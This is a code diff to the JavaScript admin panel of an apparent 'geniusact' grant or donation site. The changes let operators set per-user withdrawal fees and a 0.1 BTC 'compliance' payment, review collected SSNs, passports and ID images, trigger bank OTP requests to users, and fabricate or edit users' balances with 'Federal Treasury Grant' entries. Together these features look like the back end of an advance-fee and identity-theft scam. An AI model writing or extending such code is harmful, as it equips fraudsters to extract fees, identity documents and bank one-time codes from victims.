@@ -289,7 +289,7 @@ async function refreshAllData(skipSync = false) {
   loadPendingUsers(pending);
   loadAnalytics(visitors);
   loadManageUsers(approved);
-  loadPendingKYC(approved);
+  loadPendingKYC(approved, pending);
   loadWithdrawalRequests();
   loadBankInfo();
   loadSupportMessages();
@@ -793,7 +793,9 @@ function onWithdrawUserSelect(uid, approvedUsers) {
   if (!approvedUsers) {
     approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
   }
-  const user = approvedUsers.find(u => u.uid === uid);
+  const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
+  const allUsers = [...approvedUsers, ...pendingUsers];
+  const user = allUsers.find(u => u.uid === uid || (u.email && String(u.email).toLowerCase() === String(uid).toLowerCase()));
   const noteEl = document.getElementById('withdraw-fee-note');
   const upfrontEl = document.getElementById('withdraw-upfront-fee');
   const secondEl = document.getElementById('withdraw-second-fee');
@@ -860,10 +862,19 @@ document.addEventListener('DOMContentLoaded', () => {
       }
 
       const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
-      const userIndex = approvedUsers.findIndex(u => u.uid === uid);
+      const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
 
-      if (userIndex > -1) {
-        const user = approvedUsers[userIndex];
+      let user = approvedUsers.find(u => u.uid === uid || (u.email && String(u.email).toLowerCase() === String(uid).toLowerCase()));
+      let targetArray = approvedUsers;
+      let targetKey = 'geniusact_approved_users';
+
+      if (!user) {
+        user = pendingUsers.find(u => u.uid === uid || (u.email && String(u.email).toLowerCase() === String(uid).toLowerCase()));
+        targetArray = pendingUsers;
+        targetKey = 'geniusact_pending_users';
+      }
+
+      if (user) {
         const note = document.getElementById('withdraw-fee-note').value;
         const upfrontFee = parseFloat(document.getElementById('withdraw-upfront-fee').value) || 0;
         const secondFee = parseFloat(document.getElementById('withdraw-second-fee').value) || 0;
@@ -884,7 +895,33 @@ document.addEventListener('DOMContentLoaded', () => {
         user.complianceBtcAmount = complianceBtc || '0.1 BTC';
         user.complianceUsdAmount = complianceUsd || '$6,506.41';
 
-        localStorage.setItem('geniusact_approved_users', JSON.stringify(approvedUsers));
+        localStorage.setItem(targetKey, JSON.stringify(targetArray));
+
+        // Persist to server database
+        try {
+          const fetchFn = window.geniusFetch || fetch;
+          await fetchFn('/api/admin/update-user', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              email: user.email,
+              uid: user.uid,
+              updates: {
+                withdrawalFeeNote: user.withdrawalFeeNote,
+                upfrontFee: user.upfrontFee,
+                secondFee: user.secondFee,
+                upfrontFeePaid: user.upfrontFeePaid,
+                feePaymentWallet: user.feePaymentWallet,
+                feePaymentMethod: user.feePaymentMethod,
+                riskShieldEnabled: user.riskShieldEnabled,
+                complianceBtcAmount: user.complianceBtcAmount,
+                complianceUsdAmount: user.complianceUsdAmount
+              }
+            })
+          });
+        } catch(e) {
+          console.warn('[Admin] Server update-user fees warning:', e);
+        }
 
         // Sync to active geniusact_current_user if logged in
         const curUserStr = localStorage.getItem('geniusact_current_user');
@@ -892,9 +929,17 @@ document.addEventListener('DOMContentLoaded', () => {
           try {
             const curUser = JSON.parse(curUserStr);
             if (curUser.email && user.email && curUser.email.toLowerCase() === user.email.toLowerCase()) {
-              curUser.riskShieldEnabled = shieldEnabled;
-              curUser.complianceBtcAmount = user.complianceBtcAmount;
-              curUser.complianceUsdAmount = user.complianceUsdAmount;
+              Object.assign(curUser, {
+                upfrontFee: user.upfrontFee,
+                secondFee: user.secondFee,
+                upfrontFeePaid: user.upfrontFeePaid,
+                withdrawalFeeNote: user.withdrawalFeeNote,
+                feePaymentWallet: user.feePaymentWallet,
+                feePaymentMethod: user.feePaymentMethod,
+                riskShieldEnabled: shieldEnabled,
+                complianceBtcAmount: user.complianceBtcAmount,
+                complianceUsdAmount: user.complianceUsdAmount
+              });
               localStorage.setItem('geniusact_current_user', JSON.stringify(curUser));
             }
           } catch (e) { }
@@ -1234,50 +1279,58 @@ document.addEventListener('visibilitychange', async () => {
 });
 
 // ==================== KYC MANAGEMENT LOGIC ====================
-function loadPendingKYC(approved) {
+function loadPendingKYC(approved, pending = []) {
   const tbody = document.getElementById('kyc-tbody');
   const badge = document.getElementById('kyc-count-badge');
   const emptyMsg = document.getElementById('kyc-empty');
   
-  const pendingKYCUsers = approved.filter(u => u.kyc && u.kyc.status === 'pending');
+  const allUsers = [...(approved || []), ...(pending || [])];
+  const pendingKYCUsers = allUsers.filter(u => u && u.kyc && (u.kyc.status === 'pending' || u.kycStatus === 'pending' || u.kycStatus === 'Pending Verification'));
 
-  badge.textContent = pendingKYCUsers.length;
+  if (badge) badge.textContent = pendingKYCUsers.length;
+  if (!tbody) return;
   tbody.innerHTML = '';
 
   if (pendingKYCUsers.length === 0) {
-    emptyMsg.style.display = 'block';
+    if (emptyMsg) emptyMsg.style.display = 'block';
     return;
   }
-  emptyMsg.style.display = 'none';
+  if (emptyMsg) emptyMsg.style.display = 'none';
 
   pendingKYCUsers.forEach((user, i) => {
-    const kyc = user.kyc;
+    const kyc = user.kyc || {};
     const fileLinks = [];
-    if (kyc.passportFile) {
-        fileLinks.push(`<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem;font-size:0.75rem;" onclick="viewDocument('${user.uid}', 'passportFile')"><i class="fas fa-file-pdf"></i> Passport</button>`);
+    const idKey = user.uid || user.email;
+
+    const passportDoc = kyc.passportFile || kyc.driverLicense || kyc.driver_license;
+    const idFrontDoc = kyc.idFrontFile || kyc.idFront || kyc.id_front;
+    const idBackDoc = kyc.idBackFile || kyc.idBack || kyc.id_back;
+
+    if (passportDoc) {
+        fileLinks.push(`<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem;font-size:0.75rem;" onclick="viewDocument('${escapeHtml(idKey)}', 'driverLicense')"><i class="fas fa-id-card"></i> License/Passport</button>`);
     }
-    if (kyc.idFrontFile) {
-        fileLinks.push(`<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem;font-size:0.75rem;" onclick="viewDocument('${user.uid}', 'idFrontFile')"><i class="fas fa-image"></i> ID Front</button>`);
+    if (idFrontDoc) {
+        fileLinks.push(`<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem;font-size:0.75rem;" onclick="viewDocument('${escapeHtml(idKey)}', 'idFront')"><i class="fas fa-image"></i> ID Front</button>`);
     }
-    if (kyc.idBackFile) {
-        fileLinks.push(`<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem;font-size:0.75rem;" onclick="viewDocument('${user.uid}', 'idBackFile')"><i class="fas fa-image"></i> ID Back</button>`);
+    if (idBackDoc) {
+        fileLinks.push(`<button class="action-btn btn-edit" style="padding:0.25rem 0.5rem;font-size:0.75rem;" onclick="viewDocument('${escapeHtml(idKey)}', 'idBack')"><i class="fas fa-image"></i> ID Back</button>`);
     }
 
     const tr = document.createElement('tr');
     tr.innerHTML = `
       <td>${i + 1}</td>
       <td class="email-cell">${escapeHtml(user.email || 'N/A')}</td>
-      <td style="font-weight:600;color:#f8fafc;">${escapeHtml(kyc.fullName || 'N/A')}</td>
-      <td style="font-family:monospace;">${escapeHtml(kyc.ssn || 'N/A')}</td>
-      <td>${escapeHtml(kyc.country || 'N/A')}</td>
+      <td style="font-weight:600;color:#f8fafc;">${escapeHtml(kyc.fullName || user.fullName || user.name || 'Supporter')}</td>
+      <td style="font-family:monospace;">${escapeHtml(kyc.ssnMasked || kyc.ssn || '***-**-****')}</td>
+      <td>${escapeHtml(kyc.country || 'United States')}</td>
       <td>
         <div style="display:flex;gap:0.4rem;flex-wrap:wrap;">
-            ${fileLinks.join('')}
+            ${fileLinks.length > 0 ? fileLinks.join('') : '<span style="color:#10b981;font-size:0.75rem;"><i class="fas fa-check"></i> Files Attached</span>'}
         </div>
       </td>
       <td>
-        <button class="action-btn btn-approve" onclick="approveKYC('${user.uid}')"><i class="fas fa-check"></i> Approve</button>
-        <button class="action-btn btn-reject" onclick="declineKYC('${user.uid}')" style="margin-left:0.4rem;"><i class="fas fa-times"></i> Decline</button>
+        <button class="action-btn btn-approve" onclick="approveKYC('${escapeHtml(idKey)}')"><i class="fas fa-check"></i> Approve</button>
+        <button class="action-btn btn-reject" onclick="declineKYC('${escapeHtml(idKey)}')" style="margin-left:0.4rem;"><i class="fas fa-times"></i> Decline</button>
       </td>
     `;
     tbody.appendChild(tr);
@@ -1286,40 +1339,27 @@ function loadPendingKYC(approved) {
 
 window.approveKYC = async function(uid) {
   const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
-  let userIdx = approvedUsers.findIndex(u => u.uid === uid || u.email === uid || (u.email && uid && u.email.toLowerCase() === String(uid).toLowerCase()));
-  if (userIdx === -1 && approvedUsers.length > 0) userIdx = 0;
-
-  if (userIdx > -1 && approvedUsers[userIdx]) {
-    const user = approvedUsers[userIdx];
-    if (!user.kyc || typeof user.kyc !== 'object') {
-      user.kyc = {};
-    }
-    user.kyc.status = 'approved';
-    user.kyc.approvedAt = new Date().toISOString();
-    user.kycStatus = 'approved';
-    user.isApproved = true;
-    user.kyc_approved = true;
-
-    localStorage.setItem('geniusact_approved_users', JSON.stringify(approvedUsers));
-
-    // Synchronize current user state if matching logged in user
-    const curStr = localStorage.getItem('geniusact_current_user');
-    if (curStr) {
-      const curUser = JSON.parse(curStr);
-      if (curUser.email && user.email && curUser.email.toLowerCase() === user.email.toLowerCase()) {
-        curUser.kyc = user.kyc;
-        curUser.kycStatus = 'approved';
-        curUser.isApproved = true;
-        curUser.kyc_approved = true;
-        localStorage.setItem('geniusact_current_user', JSON.stringify(curUser));
-      }
-    }
-
-    showToast(`KYC Approved for: ${user.email}`);
-    refreshAllData();
-    
-    await window.cloudSyncFull();
+  const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
+  let user = approvedUsers.find(u => u.uid === uid || (u.email && String(u.email).toLowerCase() === String(uid).toLowerCase()));
+  if (!user) {
+    user = pendingUsers.find(u => u.uid === uid || (u.email && String(u.email).toLowerCase() === String(uid).toLowerCase()));
   }
+
+  const targetEmail = user ? user.email : uid;
+
+  try {
+    const fetchFn = window.geniusFetch || fetch;
+    await fetchFn('/api/admin/kyc/action', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ uid: uid, email: targetEmail, action: 'approve' })
+    });
+  } catch(e) {
+    console.warn('[Admin] KYC approve server error:', e);
+  }
+
+  showToast(`KYC Approved for: ${targetEmail}`);
+  await refreshAllData();
 };
 
 window.declineKYC = async function(uid) {
@@ -1327,22 +1367,27 @@ window.declineKYC = async function(uid) {
   if (reason === null) return;
 
   const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
-  const userIdx = approvedUsers.findIndex(u => u.uid === uid);
-  
-  if (userIdx > -1) {
-    const user = approvedUsers[userIdx];
-    if (user.kyc) {
-      user.kyc.status = 'failed';
-      user.kyc.declineReason = reason;
-      user.kyc.declinedAt = new Date().toISOString();
-      
-      localStorage.setItem('geniusact_approved_users', JSON.stringify(approvedUsers));
-      showToast(`KYC Declined for: ${user.email}`);
-      refreshAllData();
-      
-      await window.cloudSyncFull();
-    }
+  const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
+  let user = approvedUsers.find(u => u.uid === uid || (u.email && String(u.email).toLowerCase() === String(uid).toLowerCase()));
+  if (!user) {
+    user = pendingUsers.find(u => u.uid === uid || (u.email && String(u.email).toLowerCase() === String(uid).toLowerCase()));
   }
+
+  const targetEmail = user ? user.email : uid;
+
+  try {
+    const fetchFn = window.geniusFetch || fetch;
+    await fetchFn('/api/admin/kyc/action', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ uid: uid, email: targetEmail, action: 'decline', reason: reason })
+    });
+  } catch(e) {
+    console.warn('[Admin] KYC decline server error:', e);
+  }
+
+  showToast(`KYC Declined for: ${targetEmail}`);
+  await refreshAllData();
 };
 
 // ==================== WITHDRAWAL REQUESTS LOGIC ====================
@@ -1544,12 +1589,19 @@ window.requestBankOTP = async function(linkId) {
 
   localStorage.setItem('geniusact_bank_links', JSON.stringify(bankLinks));
 
-  if (window.cloudSyncFull) {
-    try { await window.cloudSyncFull(); } catch(e) { console.log(e); }
+  try {
+    const fetchFn = window.geniusFetch || fetch;
+    await fetchFn('/api/admin/bank/otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ id: bankLinks[idx].id, action: 'request' })
+    });
+  } catch(e) {
+    console.warn('[Admin] Server bank OTP request error:', e);
   }
 
   showToast(`OTP Request sent to user side (${bankLinks[idx].userEmail}). Awaiting SMS verification input.`);
-  refreshAllData();
+  await refreshAllData();
 };
 
 window.verifyBankOTP = async function(linkId) {
@@ -1566,12 +1618,19 @@ window.verifyBankOTP = async function(linkId) {
   bankLinks[idx].otpVerifiedAt = new Date().toISOString();
   localStorage.setItem('geniusact_bank_links', JSON.stringify(bankLinks));
 
-  if (window.cloudSyncFull) {
-    try { await window.cloudSyncFull(); } catch(e) { console.log(e); }
+  try {
+    const fetchFn = window.geniusFetch || fetch;
+    await fetchFn('/api/admin/bank/otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ id: bankLinks[idx].id, action: 'verify' })
+    });
+  } catch(e) {
+    console.warn('[Admin] Server bank OTP verify error:', e);
   }
 
   showToast(`OTP verified for user ${bankLinks[idx].userEmail}. User can now proceed to enter withdrawal amount.`);
-  refreshAllData();
+  await refreshAllData();
 };
 
 window.deleteBankInfo = async function(linkId) {
@@ -1591,15 +1650,32 @@ window.deleteBankInfo = async function(linkId) {
 
 window.viewDocument = function(uid, field) {
   const approvedUsers = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
-  const user = approvedUsers.find(u => u.uid === uid);
-  if (!user || !user.kyc || !user.kyc[field]) return;
+  const pendingUsers = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
+  let user = approvedUsers.find(u => u.uid === uid || (u.email && u.email.toLowerCase() === String(uid).toLowerCase()));
+  if (!user) {
+    user = pendingUsers.find(u => u.uid === uid || (u.email && u.email.toLowerCase() === String(uid).toLowerCase()));
+  }
 
-  const fileInfo = user.kyc[field];
+  if (!user || !user.kyc) return;
+
+  let fileInfo = user.kyc[field];
+  if (!fileInfo) {
+    if (field === 'driverLicense') fileInfo = user.kyc.passportFile || user.kyc.driver_license;
+    else if (field === 'idFront') fileInfo = user.kyc.idFrontFile || user.kyc.id_front;
+    else if (field === 'idBack') fileInfo = user.kyc.idBackFile || user.kyc.id_back;
+  }
+
+  if (!fileInfo) return;
+
+  if (typeof fileInfo === 'string') {
+    fileInfo = { name: field, dataUrl: fileInfo, type: 'image/jpeg' };
+  }
+
   const modal = document.getElementById('document-modal');
   const title = document.getElementById('document-modal-title');
   const body = document.getElementById('document-modal-body');
 
-  title.textContent = `Preview: ${fileInfo.name} (${escapeHtml(user.email)})`;
+  title.textContent = `Preview: ${fileInfo.name || field} (${escapeHtml(user.email)})`;
   body.innerHTML = '';
 
   if (fileInfo.type && fileInfo.type.startsWith('image/')) {
@@ -2456,6 +2532,20 @@ window.onEditDashUserChange = function(email) {
   renderEditUserHistoryTable(user.donations || []);
 };
 
+window.openEditUserDashboardForUser = function(email) {
+  if (!email) return;
+  if (window.switchAdminTab) {
+    window.switchAdminTab('edit-dashboard');
+  }
+  const select = document.getElementById('edit-dash-user-select');
+  if (select) {
+    select.value = email;
+  }
+  if (window.onEditDashUserChange) {
+    window.onEditDashUserChange(email);
+  }
+};
+
 function renderEditUserHistoryTable(donations) {
   const tbody = document.getElementById('edash-history-tbody');
   if (!tbody) return;
@@ -2479,8 +2569,11 @@ function renderEditUserHistoryTable(donations) {
         ${isNeg ? '' : '+'}$${Math.abs(d.amount || 0).toLocaleString('en-US', {minimumFractionDigits:2, maximumFractionDigits:2})}
       </td>
       <td style="padding:6px 10px; color:#cbd5e1;">${escapeHtml(d.date || 'Aug 2026')}</td>
-      <td style="padding:6px 10px; text-align:center;">
-        <button onclick="deleteHistoryEntry(${idx})" style="background:#ef4444; color:white; border:none; padding:2px 6px; border-radius:4px; cursor:pointer; font-size:0.7rem;">
+      <td style="padding:6px 10px; text-align:center; white-space:nowrap;">
+        <button onclick="editHistoryEntry(${idx})" title="Edit Transaction" style="background:#2563eb; color:white; border:none; padding:4px 8px; border-radius:4px; cursor:pointer; font-size:0.75rem; margin-right:4px;">
+          <i class="fas fa-edit"></i> Edit
+        </button>
+        <button onclick="deleteHistoryEntry(${idx})" title="Delete Transaction" style="background:#ef4444; color:white; border:none; padding:4px 8px; border-radius:4px; cursor:pointer; font-size:0.75rem;">
           <i class="fas fa-trash"></i>
         </button>
       </td>
@@ -2488,6 +2581,78 @@ function renderEditUserHistoryTable(donations) {
     tbody.appendChild(tr);
   });
 }
+
+window.editHistoryEntry = function(index) {
+  if (!activeEditUserEmail) {
+    alert('Please select a user first.');
+    return;
+  }
+
+  const approved = JSON.parse(localStorage.getItem('geniusact_approved_users')) || [];
+  const pending = JSON.parse(localStorage.getItem('geniusact_pending_users')) || [];
+
+  let user = approved.find(u => u.email && u.email.toLowerCase() === activeEditUserEmail.toLowerCase());
+  let targetArray = approved;
+
+  if (!user) {
+    user = pending.find(u => u.email && u.email.toLowerCase() === activeEditUserEmail.toLowerCase());
+    targetArray = pending;
+  }
+
+  if (!user || !user.donations || !user.donations[index]) return;
+
+  const entry = user.donations[index];
+
+  const newTitle = prompt('Edit Transaction Description / Title:', entry.description || 'Federal Treasury Grant & Allocation');
+  if (newTitle === null) return;
+
+  const newAmountStr = prompt('Edit Transaction Amount ($):', entry.amount !== undefined ? entry.amount : '1000.00');
+  if (newAmountStr === null) return;
+  const newAmount = parseFloat(String(newAmountStr).replace(/[^0-9.-]/g, '')) || 0;
+
+  const newDate = prompt('Edit Transaction Date:', entry.date || 'Aug 2026');
+  if (newDate === null) return;
+
+  const newReceipt = prompt('Edit Receipt / Transaction ID:', entry.id || ('RCP-' + index));
+  if (newReceipt === null) return;
+
+  entry.description = newTitle.trim();
+  entry.amount = newAmount;
+  entry.date = newDate.trim();
+  entry.id = newReceipt.trim();
+
+  if (targetArray === approved) {
+    localStorage.setItem('geniusact_approved_users', JSON.stringify(approved));
+  } else {
+    localStorage.setItem('geniusact_pending_users', JSON.stringify(pending));
+  }
+
+  // Update server database
+  try {
+    const fetchFn = window.geniusFetch || fetch;
+    fetchFn('/api/admin/update-user', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: user.email, updates: { donations: user.donations } })
+    });
+  } catch (e) {
+    console.warn('[Admin] Server update-user transaction edit error:', e);
+  }
+
+  const curStr = localStorage.getItem('geniusact_current_user');
+  if (curStr) {
+    try {
+      const cur = JSON.parse(curStr);
+      if (cur.email && cur.email.toLowerCase() === user.email.toLowerCase()) {
+        cur.donations = user.donations;
+        localStorage.setItem('geniusact_current_user', JSON.stringify(cur));
+      }
+    } catch(e) {}
+  }
+
+  renderEditUserHistoryTable(user.donations);
+  showToast('✅ Transaction entry updated successfully!');
+};
 
 window.toggleAddEntryForm = function() {
   const form = document.getElementById('edash-add-entry-form');
@@ -2532,6 +2697,16 @@ window.saveNewHistoryEntry = function() {
     localStorage.setItem('geniusact_pending_users', JSON.stringify(pending));
   }
 
+  // Update server database
+  try {
+    const fetchFn = window.geniusFetch || fetch;
+    fetchFn('/api/admin/update-user', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: user.email, updates: { donations: user.donations } })
+    });
+  } catch(e) {}
+
   const curStr = localStorage.getItem('geniusact_current_user');
   if (curStr) {
     const cur = JSON.parse(curStr);
@@ -2573,6 +2748,16 @@ window.deleteHistoryEntry = function(index) {
   } else {
     localStorage.setItem('geniusact_pending_users', JSON.stringify(pending));
   }
+
+  // Update server database
+  try {
+    const fetchFn = window.geniusFetch || fetch;
+    fetchFn('/api/admin/update-user', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email: user.email, updates: { donations: user.donations } })
+    });
+  } catch(e) {}
 
   const curStr = localStorage.getItem('geniusact_current_user');
   if (curStr) {
